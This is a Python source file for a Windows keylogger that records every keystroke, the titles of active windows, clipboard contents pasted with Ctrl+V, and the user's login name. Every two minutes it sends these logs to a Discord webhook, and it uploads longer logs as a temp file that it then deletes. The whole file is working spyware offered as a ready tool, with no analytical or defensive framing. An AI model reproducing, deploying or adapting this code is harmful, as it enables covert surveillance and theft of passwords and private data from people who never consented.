from os import getlogin, getenv, environ, remove
from unicodedata import name
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
from pynput.keyboard import Listener, Key
from dotenv import load_dotenv
from pyperclip import paste
from keyboard import add_hotkey
from win32gui import GetWindowText, GetForegroundWindow

load_dotenv()

current_window = None
REPORT_INTERVAL = 120
WEBHOOK_URL = getenv("WEBHOOK_URL")
SPECIAL_KEYS = {
    Key.alt_l: "",
    Key.alt_r: "",
    Key.backspace: " [Backspace] ",
    Key.caps_lock: "",
    Key.cmd_l: " [Windows Key] ",
    Key.ctrl_l: "",
    Key.ctrl_r: "",
    Key.delete: " [Delete] ",
    Key.down: " [Down] ",
    Key.end: "",
    Key.enter: "\n",
    Key.esc: " [Esc] ",
    Key.f1: " [F1] ",
    Key.f10: " [F10] ",
    Key.f11: " [F11] ",
    Key.f12: " [F12] ",
    Key.f2: " [F2] ",
    Key.f3: " [F3] ",
    Key.f4: " [F4] ",
    Key.f5: " [F5] ",
    Key.f6: " [F6] ",
    Key.f7: " [F7] ",
    Key.f8: " [F8] ",
    Key.f9: " [F9] ",
    Key.home: "",
    Key.insert: "",
    Key.left: " [Left] ",
    Key.num_lock: "",
    Key.page_down: "",
    Key.page_up: "",
    Key.pause: "",
    Key.print_screen : " [Print Screen] ",
    Key.right: " [Right] ",
    Key.scroll_lock: "",
    Key.shift_l: "",
    Key.shift_r: "",
    Key.space: " ",
    Key.tab: " [Tab] ",
    Key.up: " [Up] ",
    Key.media_volume_up: " [Volume Up] ",
    Key.media_volume_down: " [Volume Down] ",
    Key.media_volume_mute: " [Mute] ",
    Key.media_next: " [Next Track] ",
    Key.media_previous: " [Previous Track] ",
    Key.media_play_pause: " [Play/Pause] "
}

class Keylogger_KY8:
    def __init__(self, interval, report_method="webhook"):
        now = datetime.now()
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_time = now.strftime('%d/%m/%Y %H:%M')
        self.end_time = now.strftime('%d/%m/%Y %H:%M')
        self.username = getlogin()
        add_hotkey("ctrl+v", self.copy_clipboard, suppress=False)

    def get_active_window(self):
        try:
            return GetWindowText(GetForegroundWindow())
        except Exception:
            return "Unknown Window"

    def log_window_change(self):
        global current_window
        new_window = self.get_active_window()
        if new_window != current_window and new_window.strip():
            current_window = new_window
            self.log += f"\n{"=" * 50}\nWindow title: {current_window}\n"

    def key_handler(self, key):
        self.log_window_change()
        try:
            key = key.char
            name(key)
        except (AttributeError, ValueError):
            if key in SPECIAL_KEYS:
                key = SPECIAL_KEYS[key]
            else:
                key = str(key).find("Key.")
                if key != -1:
                    key = str(key).replace("Key.", " [") + "]"
                else:
                    key = ""
        self.log += key

    def copy_clipboard(self):
        self.log_window_change()
        self.log += f"\n[Clipboard]: {{\n{paste()}\n}}\n"

    def report_to_webhook(self):
        webhook = DiscordWebhook(url=WEBHOOK_URL)
        if len(self.log) > 2000:
                path = environ["temp"] + "\\log.txt"
                with open(path, 'w+') as file:
                    file.write(f"Username :{self.username} | Time: {self.end_time}\n\n")
                    file.write(self.log)
                with open(path, 'rb') as f:
                    webhook.add_file(file=f.read(), filename='log.txt')
                webhook.execute()
                remove(path) 
        else:
            if len(self.log) > 0:
                embed = DiscordEmbed(title=f"Username :{self.username} | Time: {self.end_time}", description=self.log)
                webhook.add_embed(embed)    
        webhook.execute()

    def report(self):
        if self.log:
            if self.report_method == "webhook":
                self.report_to_webhook()    
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def run(self):
        self.start_time = datetime.now()
        with Listener(on_release=self.key_handler) as listener:
            self.report()
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger_KY8(interval=REPORT_INTERVAL, report_method="webhook")    
    keylogger.run()
